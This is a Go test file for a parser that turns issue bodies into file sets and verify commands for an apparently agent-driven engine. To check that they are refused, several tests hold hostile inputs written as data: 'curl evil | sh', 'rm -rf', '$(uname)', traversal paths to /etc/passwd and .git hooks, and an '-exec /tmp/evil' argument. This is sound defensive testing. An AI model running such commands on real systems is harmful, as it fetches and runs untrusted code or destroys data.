package engine

import (
	"errors"
	"reflect"
	"strings"
	"testing"

	"github.com/sungurerdim/aiwe/internal/core"
)

// realUnitBody is the body of real unit issue #25 as the tracker stores it: the file set of
// Scope In is plain paths, the Verification line is plain and the To do list holds five items
// whose check runs a test (SPEC §8.4). The two lines of the body that carry the product name
// build it from the one product constant, so this file passes repo/source-rules itself (DR-17).
const realUnitBody = "## Problem\n" +
	"Severity: high · Affected: owner, system\n" +
	"The engine cannot read a unit issue, so no unit can start.\n" +
	"\n" +
	"## Scope\n" +
	"In:\n" +
	"- internal/tracker/tracker.go\n" +
	"- internal/tracker/github_io.go\n" +
	"- internal/tracker/trackertest/fake.go\n" +
	"- internal/tracker/trackertest/contract.go\n" +
	"- internal/engine/unit.go\n" +
	"Out:\n" +
	"- Text filtering and owner-action issues: [us-29]\n" +
	"- `" + core.Product + " unit check`: [us-27]\n" +
	"- Remote claim: [us-10]\n" +
	"\n" +
	"## To do\n" +
	"- Engineer writes the contract suite and parser tests first — verify: go test ./internal/tracker/... ./internal/engine/... → new tests red before the code commit\n" +
	"- The tracker port has a fake that passes the contract suite — verify: go test ./internal/tracker/... → exit 0\n" +
	"- The GitHub adapter reads issues over HTTPS with the standard library; token from GH_TOKEN, then GITHUB_TOKEN, then gh auth token when gh exists; gh is never required (merged #26) — verify: go test ./internal/tracker/... → token-order test passes with gh absent\n" +
	"- The parser reads the file set from Scope In, the verify from Verification and test items from To do; a body without them is refused with the missing section named — verify: go test ./internal/engine/... → parser tests pass for empty, Unicode and oversized bodies\n" +
	"- No token value reaches a log, error or record — verify: go test ./internal/tracker/... → redaction test passes\n" +
	"- Security-reviewer reviews token handling and HTTP response limits — verify: review verdict → PASS\n" +
	"\n" +
	"## Verification\n" +
	"go test ./internal/tracker/... ./internal/engine/... → exit 0\n" +
	"\n" +
	"## Done criteria\n" +
	"- A real unit issue parses into file set, verify and test items\n" +
	"- The fake passes the same contract suite as the adapter\n" +
	"\n" +
	"## Links\n" +
	"- Merged: #26\n" +
	"- Re-plan L3\n" +
	"\n" +
	"## Rules of this repository\n" +
	"- Read AGENTS.md first, then only the SPEC sections the unit needs (docs/SPEC.md §4 and §5 hold the coding rules).\n" +
	"- Change only the paths listed under Scope In. A commit with another path is refused by the pre-commit hook.\n" +
	"- Size limits: source file at most 400 lines, test file at most 500, at most 5 non-test source files per unit.\n" +
	"- Go, standard library first; no new third-party dependency. English only. No machine-specific path.\n" +
	"- Tests run the production entry point with realistic values; never skip, weaken or mock away an assertion.\n" +
	"- Commit message: `<type>(<scope>): <subject>` at most 50 characters, blank line, body lines at most 72,\n" +
	"  last line `Refs sungurerdim/" + core.Product + "#25`. Types: feat, fix, test, refactor, docs, build, ci, chore.\n" +
	"- You cannot run any program. The lead runs the verify command and sends you its output when needed.\n"

// unicodeUnitBody is the same standard with prose in another language: the parser reads UTF-8
// text, so the markers stay the only English it needs.
const unicodeUnitBody = "## Problem\n" +
	"Severity: high · Affected: owner, system\n" +
	"Motor okunamıyor; açıklama İstanbul'dan geliyor ve hiçbir birim başlamıyor.\n" +
	"\n" +
	"## Scope\n" +
	"In:\n" +
	"- `internal/tracker/github_io.go`\n" +
	"Out:\n" +
	"- hiçbiri\n" +
	"\n" +
	"## To do\n" +
	"- GitHub bağdaştırıcısı issues uç noktasını okur — verify: `go test ./internal/tracker/...` → exit 0\n" +
	"\n" +
	"## Verification\n" +
	"`go test ./internal/tracker/...` → exit 0\n"

// The pieces a minimal body reuses to isolate one missing section.
const (
	unitProblem = "## Problem\nSeverity: high · Affected: owner, system\nA section is missing.\n\n"
	unitScope   = "## Scope\nIn:\n- `internal/engine/unit.go`\nOut:\n- none\n\n"
	unitVerify  = "## Verification\n`go test ./internal/engine/...` → exit 0\n\n"
	unitToDo    = "## To do\n- Write the parser tests — verify: `go test ./internal/engine/...` → pass\n"
)

func TestParseUnitRealIssue(t *testing.T) {
	got, err := ParseUnit(realUnitBody)
	if err != nil {
		t.Fatalf("ParseUnit(real issue) error = %v, want nil", err)
	}
	wantFiles := []string{
		"internal/tracker/tracker.go",
		"internal/tracker/github_io.go",
		"internal/tracker/trackertest/fake.go",
		"internal/tracker/trackertest/contract.go",
		"internal/engine/unit.go",
	}
	if !reflect.DeepEqual(got.Files, wantFiles) {
		t.Errorf("Files = %q, want %q", got.Files, wantFiles)
	}
	wantVerify := []string{"go test ./internal/tracker/... ./internal/engine/..."}
	if !reflect.DeepEqual(got.Verify, wantVerify) {
		t.Errorf("Verify = %q, want %q", got.Verify, wantVerify)
	}
	wantTests := []string{
		"Engineer writes the contract suite and parser tests first — verify: go test ./internal/tracker/... ./internal/engine/... → new tests red before the code commit",
		"The tracker port has a fake that passes the contract suite — verify: go test ./internal/tracker/... → exit 0",
		"The GitHub adapter reads issues over HTTPS with the standard library; token from GH_TOKEN, then GITHUB_TOKEN, then gh auth token when gh exists; gh is never required (merged #26) — verify: go test ./internal/tracker/... → token-order test passes with gh absent",
		"The parser reads the file set from Scope In, the verify from Verification and test items from To do; a body without them is refused with the missing section named — verify: go test ./internal/engine/... → parser tests pass for empty, Unicode and oversized bodies",
		"No token value reaches a log, error or record — verify: go test ./internal/tracker/... → redaction test passes",
	}
	if !reflect.DeepEqual(got.Tests, wantTests) {
		t.Errorf("Tests = %q, want %q", got.Tests, wantTests)
	}
}

// TestParseUnitPlainScopeLine covers the plain Scope In forms of the standard: a path with and
// without the `(new)` marker (SPEC §8.4).
func TestParseUnitPlainScopeLine(t *testing.T) {
	body := "## Problem\nSeverity: low · Affected: system\nA new file is planned.\n\n" +
		"## Scope\nIn:\n- internal/engine/unit.go\n- internal/engine/unit_io.go (new)\nOut:\n- none\n\n" +
		"## Verification\n`go test ./internal/engine/...` → exit 0\n\n" +
		"## To do\n- Write the parser tests — verify: `go test ./internal/engine/...` → pass\n"
	got, err := ParseUnit(body)
	if err != nil {
		t.Fatalf("ParseUnit(plain Scope In) error = %v, want nil", err)
	}
	want := []string{"internal/engine/unit.go", "internal/engine/unit_io.go"}
	if !reflect.DeepEqual(got.Files, want) {
		t.Errorf("Files = %q, want %q", got.Files, want)
	}
}

// TestParseUnitIgnoresAPlainNonPathEntry covers the file set of a Scope In list: a plain item that
// is not a repository path, such as the placeholder `none`, is no file of the unit, so the set
// never grows with a word that names nothing (DR-7, SPEC §8.4).
func TestParseUnitIgnoresAPlainNonPathEntry(t *testing.T) {
	body := unitProblem + "## Scope\nIn:\n- internal/engine/unit.go\n- none\nOut:\n- none\n\n" + unitVerify + unitToDo
	got, err := ParseUnit(body)
	if err != nil {
		t.Fatalf("ParseUnit(Scope In with the placeholder none) error = %v, want nil", err)
	}
	if want := []string{"internal/engine/unit.go"}; !reflect.DeepEqual(got.Files, want) {
		t.Errorf("Files = %q, want %q", got.Files, want)
	}

	only := unitProblem + "## Scope\nIn:\n- none\nOut:\n- none\n\n" + unitVerify + unitToDo
	var missing *MissingSectionError
	if _, err := ParseUnit(only); !errors.As(err, &missing) || missing.Section != "Scope" {
		t.Errorf("ParseUnit(Scope In of the placeholder only) error = %v, want the %q section missing", err, "Scope")
	}
}

// TestParseUnitRefusesProseAsVerify covers DR-7: a Verification section whose only line is a To do
// style list item is no verify, so a unit is never dispatched on an item of prose that carries an
// arrow (SPEC §8.4).
func TestParseUnitRefusesProseAsVerify(t *testing.T) {
	body := unitProblem + unitScope + "## Verification\n- nothing to run → done\n\n" + unitToDo
	_, err := ParseUnit(body)
	if !errors.Is(err, ErrUnitSectionMissing) {
		t.Fatalf("ParseUnit(a list item as its only Verification line) error = %v, want ErrUnitSectionMissing", err)
	}
	var missing *MissingSectionError
	if !errors.As(err, &missing) || missing.Section != "Verification" {
		t.Errorf("missing section = %v, want %q", err, "Verification")
	}
}

// TestParseUnitRefusesPathOutsideTheClone covers the file-set rule of the standard: a Scope In
// entry that is absolute, Windows-separated or steps out of the clone with `..` is no repository
// path, so the body is refused and the offending entry is named (SPEC §8.4).
func TestParseUnitRefusesPathOutsideTheClone(t *testing.T) {
	paths := []string{"/etc/passwd", "../../etc/passwd", "internal/../../etc/passwd", `internal\engine`}
	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			body := unitProblem + "## Scope\nIn:\n- internal/engine/unit.go\n- " + path + "\nOut:\n- none\n\n" +
				unitVerify + unitToDo
			_, err := ParseUnit(body)
			if !errors.Is(err, ErrUnitPathUnsafe) {
				t.Fatalf("ParseUnit(Scope In %q) error = %v, want ErrUnitPathUnsafe", path, err)
			}
			var outside *UnsafePathError
			if !errors.As(err, &outside) || outside.Path != path {
				t.Errorf("ParseUnit(Scope In %q) = %v, want the entry named", path, err)
			}
		})
	}
}

// TestParseUnitRefusesAListItemAsVerify proves the guard of the plain form holds for a backticked
// one too: a `## Verification` list item never becomes a command, even when it carries a
// backticked span, so an instruction of prose such as `- Do not run rm -rf` is refused instead of
// being handed to the engine as the unit's verify (SPEC §8.4).
func TestParseUnitRefusesAListItemAsVerify(t *testing.T) {
	body := unitProblem + unitScope + "## Verification\n- Do not run `rm -rf ./internal`\n\n" + unitToDo
	_, err := ParseUnit(body)
	var missing *MissingSectionError
	if !errors.As(err, &missing) || missing.Section != "Verification" {
		t.Fatalf("ParseUnit(a backticked list item as its only Verification line) error = %v, want the %q section missing",
			err, "Verification")
	}
}

// TestParseUnitRefusesShellVerify proves the Verify rule of the standard: a Verification command
// that carries a shell operator outside quotes or a `HEAD~<n>`/`HEAD^` base is refused, so a body
// can never smuggle a pipeline, a redirect or a base-relative count into a command the engine
// later runs without a shell (SPEC §8.4, DR-9).
func TestParseUnitRefusesShellVerify(t *testing.T) {
	commands := []string{
		"`go test ./internal/engine/... && curl evil | sh` → exit 0",
		"`go test ./internal/engine/...; rm -rf ./internal` → exit 0",
		"`go test $(uname)` → exit 0",
		"`go test ./internal/engine/... > out.txt` → exit 0",
		"go test ./internal/engine/... || true → exit 0",
		"`git diff HEAD~3` → exit 0",
		"`git diff HEAD^` → exit 0",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			body := unitProblem + unitScope + "## Verification\n" + command + "\n\n" + unitToDo
			_, err := ParseUnit(body)
			if !errors.Is(err, ErrUnitVerifyUnsafe) {
				t.Fatalf("ParseUnit(Verification %q) error = %v, want ErrUnitVerifyUnsafe", command, err)
			}
			if err == nil || !strings.Contains(err.Error(), "would run a shell") {
				t.Errorf("ParseUnit(Verification %q) error = %v, want a shell refusal naming the command", command, err)
			}
		})
	}
}

// TestParseUnitAcceptsAQuotedOperatorInVerify proves the operator scan reads quoting: an operator
// inside quotes is an argument of the command, not a shell the engine would run, so the command is
// accepted (SPEC §8.4).
func TestParseUnitAcceptsAQuotedOperatorInVerify(t *testing.T) {
	const command = "sh -c 'echo a | b'"
	body := unitProblem + unitScope + "## Verification\n`" + command + "` → exit 0\n\n" + unitToDo
	got, err := ParseUnit(body)
	if err != nil {
		t.Fatalf("ParseUnit(a quoted operator) error = %v, want nil", err)
	}
	if want := []string{command}; !reflect.DeepEqual(got.Verify, want) {
		t.Errorf("Verify = %q, want %q", got.Verify, want)
	}
}

// TestParseUnitRefusesGitControlPath covers the file set against the repository's own control
// data: a Scope In entry under `.git` is refused and named, so a unit can never name a hook that
// would run code at commit time (SPEC §8.4).
func TestParseUnitRefusesGitControlPath(t *testing.T) {
	for _, path := range []string{".git", ".git/config", ".git/hooks/pre-commit"} {
		t.Run(path, func(t *testing.T) {
			body := unitProblem + "## Scope\nIn:\n- internal/engine/unit.go\n- `" + path + "`\nOut:\n- none\n\n" +
				unitVerify + unitToDo
			_, err := ParseUnit(body)
			var unsafe *UnsafePathError
			if !errors.As(err, &unsafe) || unsafe.Path != path {
				t.Fatalf("ParseUnit(Scope In %q) error = %v, want the entry named", path, err)
			}
		})
	}
}

func TestParseUnitUnicodeBody(t *testing.T) {
	got, err := ParseUnit(unicodeUnitBody)
	if err != nil {
		t.Fatalf("ParseUnit(unicode issue) error = %v, want nil", err)
	}
	wantFiles := []string{"internal/tracker/github_io.go"}
	if !reflect.DeepEqual(got.Files, wantFiles) {
		t.Errorf("Files = %q, want %q", got.Files, wantFiles)
	}
	wantVerify := []string{"go test ./internal/tracker/..."}
	if !reflect.DeepEqual(got.Verify, wantVerify) {
		t.Errorf("Verify = %q, want %q", got.Verify, wantVerify)
	}
	wantTests := []string{
		"GitHub bağdaştırıcısı issues uç noktasını okur — verify: `go test ./internal/tracker/...` → exit 0",
	}
	if !reflect.DeepEqual(got.Tests, wantTests) {
		t.Errorf("Tests = %q, want %q", got.Tests, wantTests)
	}
}

// TestParseUnitTestItemsFollowTheFileSet covers the To do test-item rule: a check that runs the
// tests of a package of the file set is a test item, a check that names a test file of the file set
// is one, and a check that names a test file or runs a package outside the set is not (SPEC §8.4).
func TestParseUnitTestItemsFollowTheFileSet(t *testing.T) {
	tests := []struct {
		name     string
		scopeIn  string
		toDo     string
		wantTest bool
	}{
		{
			name:     "a package run is a test item",
			scopeIn:  "- internal/engine/unit.go",
			toDo:     "Write the parser tests — verify: `go test ./internal/engine/...` → pass",
			wantTest: true,
		},
		{
			name:     "a test file of the file set is a test item",
			scopeIn:  "- internal/engine/unit.go\n- internal/engine/unit_test.go",
			toDo:     "Write the parser tests — verify: `go test internal/engine/unit_test.go` → pass",
			wantTest: true,
		},
		{
			name:     "a package run outside the file set is not a test item",
			scopeIn:  "- internal/engine/unit.go",
			toDo:     "Write the tracker tests — verify: go test ./internal/tracker/... → pass",
			wantTest: false,
		},
		{
			name:     "a test file outside the file set is not a test item",
			scopeIn:  "- internal/engine/unit.go",
			toDo:     "Write the tracker tests — verify: `go test internal/tracker/github_test.go` → pass",
			wantTest: false,
		},
		{
			name:     "a run naming a test file outside the file set is not a test item",
			scopeIn:  "- internal/engine/unit.go",
			toDo:     "Write the tracker tests — verify: `go test ./internal/tracker/... internal/tracker/github_test.go` → pass",
			wantTest: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := "## Problem\nSeverity: high · Affected: system\nA test item is decided.\n\n" +
				"## Scope\nIn:\n" + tt.scopeIn + "\nOut:\n- none\n\n" +
				"## Verification\n`go test ./internal/engine/...` → exit 0\n\n" +
				"## To do\n- " + tt.toDo + "\n"
			got, err := ParseUnit(body)
			if tt.wantTest {
				if err != nil {
					t.Fatalf("ParseUnit(%s) error = %v, want nil", tt.name, err)
				}
				if want := []string{tt.toDo}; !reflect.DeepEqual(got.Tests, want) {
					t.Errorf("Tests = %q, want %q", got.Tests, want)
				}
				return
			}
			if !errors.Is(err, ErrUnitSectionMissing) {
				t.Fatalf("ParseUnit(%s) error = %v, want ErrUnitSectionMissing", tt.name, err)
			}
			var missing *MissingSectionError
			if !errors.As(err, &missing) || missing.Section != "To do" {
				t.Errorf("ParseUnit(%s) missing section = %v, want %q", tt.name, err, "To do")
			}
		})
	}
}

func TestParseUnitRefusesMissingSection(t *testing.T) {
	tests := []struct {
		name        string
		body        string
		wantSection string // "" accepts any named section
	}{
		{name: "empty body names a section", body: ""},
		{name: "scope missing", body: unitProblem + unitVerify + unitToDo, wantSection: "Scope"},
		{name: "verification missing", body: unitProblem + unitScope + unitToDo, wantSection: "Verification"},
		{name: "to do missing", body: unitProblem + unitScope + unitVerify, wantSection: "To do"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ParseUnit(tt.body)
			if err == nil {
				t.Fatalf("ParseUnit(%s) = nil error, want a missing-section error", tt.name)
			}
			if !errors.Is(err, ErrUnitSectionMissing) {
				t.Fatalf("ParseUnit(%s) error = %v, want ErrUnitSectionMissing", tt.name, err)
			}
			var missing *MissingSectionError
			if !errors.As(err, &missing) {
				t.Fatalf("ParseUnit(%s) error = %v, want *MissingSectionError", tt.name, err)
			}
			if missing.Section == "" {
				t.Errorf("ParseUnit(%s) names no missing section", tt.name)
			}
			if tt.wantSection != "" && missing.Section != tt.wantSection {
				t.Errorf("missing section = %q, want %q", missing.Section, tt.wantSection)
			}
		})
	}
}

func TestParseUnitRefusesOversizedBody(t *testing.T) {
	body := strings.Repeat("a", MaxUnitBodySize+1)
	_, err := ParseUnit(body)
	if !errors.Is(err, ErrUnitBodyTooLarge) {
		t.Fatalf("ParseUnit(body of %d bytes) error = %v, want ErrUnitBodyTooLarge", len(body), err)
	}
}

// scopeOf renders a Scope section whose In: list holds one backticked item per path.
func scopeOf(paths []string) string {
	var b strings.Builder
	b.WriteString("## Scope\nIn:\n")
	for _, path := range paths {
		b.WriteString("- `" + path + "`\n")
	}
	return b.String() + "Out:\n- none\n\n"
}

// TestParseUnitVerifyReadsOnlyTheCommandBeforeTheSignal covers the two-span Verification line: the
// span after `→` is the signal, so its text never becomes an argument of the command the engine runs
// (SPEC §8.4).
func TestParseUnitVerifyReadsOnlyTheCommandBeforeTheSignal(t *testing.T) {
	const (
		command = "go test ./internal/engine/..."
		signal  = "-exec /tmp/evil"
	)
	for _, line := range []string{
		"`" + command + "` → `" + signal + "`",
		command + " → `" + signal + "`",
	} {
		t.Run(line, func(t *testing.T) {
			body := unitProblem + unitScope + "## Verification\n" + line + "\n\n" + unitToDo
			got, err := ParseUnit(body)
			if err != nil {
				t.Fatalf("ParseUnit(Verification %q) error = %v, want nil", line, err)
			}
			if want := []string{command}; !reflect.DeepEqual(got.Verify, want) {
				t.Errorf("Verify = %q, want %q", got.Verify, want)
			}
			if cmd := strings.Join(got.Verify, " "); strings.Contains(cmd, signal) {
				t.Errorf("Verify = %q, want the signal %q absent from the command", got.Verify, signal)
			}
		})
	}
}

// TestParseUnitRefusesAScopeOverTheCeiling covers the ceiling of DR-7: a file set of more than five
// source files is refused with the count named, while test, lock and generated files and
// `go.mod`/`go.sum` do not count against it (SPEC §8.4).
func TestParseUnitRefusesAScopeOverTheCeiling(t *testing.T) {
	overflow := []string{"internal/engine/unit.go", "internal/engine/a.go", "internal/engine/b.go",
		"internal/engine/c.go", "internal/engine/d.go", "internal/engine/e.go"}
	_, err := ParseUnit(unitProblem + scopeOf(overflow) + unitVerify + unitToDo)
	if !errors.Is(err, ErrUnitScopeTooWide) {
		t.Fatalf("ParseUnit(%d source files) error = %v, want ErrUnitScopeTooWide", len(overflow), err)
	}
	if !strings.Contains(err.Error(), "6") {
		t.Errorf("error = %v, want the count %d named", err, len(overflow))
	}

	allowed := append(overflow[:5:5], "internal/engine/unit_test.go", "go.mod", "go.sum",
		"internal/engine/deps.lock")
	got, err := ParseUnit(unitProblem + scopeOf(allowed) + unitVerify + unitToDo)
	if err != nil {
		t.Fatalf("ParseUnit(%d entries, 5 source files) error = %v, want nil", len(allowed), err)
	}
	if len(got.Files) != len(allowed) {
		t.Errorf("Files = %q, want the %d entries of the file set", got.Files, len(allowed))
	}
}

// TestParseUnitRefusesANonPathScopeEntry covers the file-set rule of the standard: a Scope In entry
// that is no plain repository path — a `(new)` marker with no path before it, a marker that is not
// the last text of the entry, or a glob — is refused with the entry named (SPEC §8.4).
func TestParseUnitRefusesANonPathScopeEntry(t *testing.T) {
	for _, entry := range []string{"`(new)`", "`internal/engine/unit.go (new) extra`", "`internal/engine/*.go`"} {
		t.Run(entry, func(t *testing.T) {
			body := unitProblem + "## Scope\nIn:\n- internal/engine/unit.go\n- " + entry +
				"\nOut:\n- none\n\n" + unitVerify + unitToDo
			_, err := ParseUnit(body)
			if !errors.Is(err, ErrUnitPathUnsafe) {
				t.Fatalf("ParseUnit(Scope In %s) error = %v, want ErrUnitPathUnsafe", entry, err)
			}
			var unsafe *UnsafePathError
			if !errors.As(err, &unsafe) || unsafe.Path == "" || !strings.Contains(entry, unsafe.Path) {
				t.Errorf("ParseUnit(Scope In %s) = %v, want the entry named", entry, err)
			}
		})
	}
}

// FuzzParseUnit catches a parser of the untrusted issue body that panics, or that accepts a body
// which is no unit because it names no file set or no verify command (SPEC §5.13, §8.4).
func FuzzParseUnit(f *testing.F) {
	f.Add(realUnitBody)
	f.Add(unicodeUnitBody)
	f.Add("")
	f.Add("## Scope\nIn:\n- `internal/engine/unit.go`\n")
	f.Fuzz(func(t *testing.T, body string) {
		got, err := ParseUnit(body)
		if err != nil {
			return
		}
		if len(got.Files) == 0 || len(got.Verify) == 0 {
			t.Fatalf("ParseUnit accepted %q with files %q and verify %q", body, got.Files, got.Verify)
		}
	})
}
